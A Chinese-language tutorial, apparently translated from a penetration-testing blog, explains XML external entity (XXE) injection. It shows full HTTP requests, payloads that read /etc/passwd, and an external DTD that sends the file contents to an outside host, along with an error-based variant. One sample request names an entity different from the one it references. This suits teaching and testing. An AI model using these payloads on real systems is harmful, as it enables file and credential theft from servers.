# 通过服务器错误消息强制反射XXE

XML外部实体注入（XXE）攻击能通过网络请求从远程服务器中提取文件。要想使用XXE，服务器响应中必须要有一个反射点，这个反射点用于显示返回到客户端上的注入实体（远程文件）。下面是一个常见的XXE注入请求和响应的。红色标出的就是注入。

| 12345 || `POST /netspi HTTP/1.1``Host: someserver.netspi.com``Accept: application/json``Content-Type: application/xml``Content-Length: 288` |
| --- | --- |

| 123456 || `<?``xml` `version``=``"1.0"` `encoding``=``"UTF-8"` `?>``<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>``<``root``>``<``search``>name</``search``>``<``value``>&netspi;</``value``>``</``root``>` |
| --- | --- |

| 12345 || `HTTP Response:`` ` `HTTP/1.1 200 OK``Content-Type: application/xml``Content-Length: 2467` |
| --- | --- |

| 123456789 || `<?``xml` `version``=``"1.0"` `encoding``=``"UTF-8"``?>``<``errors``>``<``error``>no results for name root:x:0:0:root:/root:/bin/bash``daemon:x:1:1:daemon:/usr/sbin:/bin/sh``bin:x:2:2:bin:/bin:/bin/sh``sys:x:3:3:sys:/dev:/bin/sh``sync:x:4:65534:sync:/bin:/bin/sync....``</``error``>``</``errors``>` |
| --- | --- |

然而，如果应用程序没有反射任何用户输入至客户端，那么错误响应就很可能会什么都不返回。这样的话，简单的XXE攻击也会很难执行。如果，远程系统能连接到存在漏洞的服务器，那么就能通过网络请求利用外部DTD来提取本地文件。这篇文章对该技术进行了详细的介绍，但是下文主要叙述了修改后的XXE注入技术是如何工作的，以及其执行原理。  
1.在web服务器上托管一个.dtd文件，必须要能从有漏洞的系统上访问这个服务器。在我的举例中， 我把“netspi.dtd”文件托管在了 xxe.netspi.com上。DTD文件中包含一个XXE注入，注入会把/etc/password中的内容发送至http://xxe.netspi.com 。

| 1 || `<!ENTITY % payload SYSTEM "file:///etc/passwd">` |
| --- | --- |

<!ENTITY % param1 '<!ENTITY % external SYSTEM "http://xxe.netspi.com/x=%payload;">'> %param1; %external;

2.接下来，通过引用托管的DTD文件（如下），就可以执行攻击。这个请求中可以不包含任何XML主体，只要服务器能处理XML请求就行。

| 1 || `HTTP Request:` |
| --- | --- |

| 12345 || `POST /netspi HTTP/1.1``Host: someserver.netspi.com``Accept: application/json``Content-Type: application/xml``Content-Length: 139` |
| --- | --- |

| 12345 || `<?``xml` `version``=``"1.0"` `encoding``=``"UTF-8"` `?>``<!DOCTYPE foo SYSTEM "http://xxe.netspi.com/netspi.dtd">``<``root``>``<``search``>name</``search``>``</``root``>` |
| --- | --- |

3.这时，XXE攻击连接xxe.netspi.com，从而加载外部的DTD文件。然后，托管的DTD文件利用参数实体将/etc/passwd文件中的内容包装到另一个HTTP请求中，并发送至xxe.netspi.com。  

4.至此，不需要网页本身上的反射点，只需要读取进入 xxe.netspi.com的流量，就能提取/etc/passwd文件中的内容了。从web服务器日志或实际页面上，可以解析该文件的内容。

我要在这里说明一点，使用这种方式只能读取/etc/passwd的一行，而且，由于目标文件存在换行，所以HTTP请求可能也会失效。不过，还有另一种选择。在某些情况下，通过在请求中添加一个无效的URI，强制服务器发生错误，也可能提取到数据。下面是一个经过修改后的DTD的实例：  

| 12 || `<!ENTITY % payload SYSTEM "file:///etc/passwd">``<!ENTITY % param1 '<!ENTITY % external SYSTEM "file:///nothere/%payload;">'> %param1; %external;` |
| --- | --- |
